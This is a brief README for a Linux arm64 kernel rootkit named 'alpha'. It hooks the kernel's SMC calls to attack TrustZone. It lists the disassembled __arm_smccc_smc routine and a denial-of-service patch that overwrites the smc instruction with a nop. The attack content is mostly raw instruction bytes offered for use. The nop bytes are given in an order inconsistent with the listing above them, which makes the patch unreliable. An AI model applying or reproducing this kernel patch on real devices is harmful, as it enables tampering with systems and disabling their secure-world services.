# alpha
alpha is a simple kernel rootkit (Linux arm64) to attack the TrustZone. He erases the smc_handle function of the kernel to hook calls to the SMC instruction. It has been tested with OP-TEE but should work with any other TrustZone implementation.

### __arm_smccc_smc (include/linux/arm-smccc.h)   
   
```
03 00 00 d4     smc   #0x0   
e4 03 40 f9     ldr   x4, [sp]   
80 04 00 a9     stp   x0, x1, [x4]   
82 0c 01 a9     stp   x2, x3, [x4,#16]   
e4 07 40 f9     ldr   x4, [sp,#8]   
a4 00 00 b4     cbz   x4, 0x00000028   
89 00 40 f9     ldr   x9, [x4]   
3f 05 00 f1     cmp   x9, #0x1   
41 00 00 54     b.ne  0x00000028   
86 04 00 f9     str   x6, [x4,#8]   
c0 03 5f d6     ret
```   

First line is obviously le SMC call.

   
### DoS attack   
   
Replace the first instruction of the function:   
```   
03 00 00 d4     smc   #0x0   
```   

With the following instruction:   
```   
d5 03 20 1f     nop      
```   

### References.  

http://infocenter.arm.com/help/topic/com.arm.doc.den0028b/ARM_DEN0028B_SMC_Calling_Convention.pdf   
https://elixir.bootlin.com/linux/v4.19/source/include/linux/arm-smccc.h   
https://elixir.bootlin.com/linux/v4.19/source/arch/arm64/kernel/smccc-call.S   
